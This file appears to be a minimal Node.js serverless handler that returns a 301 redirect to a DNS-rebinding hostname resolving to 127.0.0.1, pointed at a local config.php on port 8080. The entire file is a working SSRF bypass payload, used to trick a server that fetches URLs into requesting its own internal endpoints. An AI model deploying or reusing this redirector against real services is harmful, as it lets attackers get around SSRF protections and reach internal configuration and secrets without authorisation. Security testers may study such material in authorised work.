module.exports = (req, res) => {
  res.statusCode = 301;
  res.setHeader(
    "Location",
    "http://make-127.0.0.1-rebind-127.0-0.1-rr.1u.ms:008080/config.php?test=testxsdffs.png"
  );
  res.end();
};
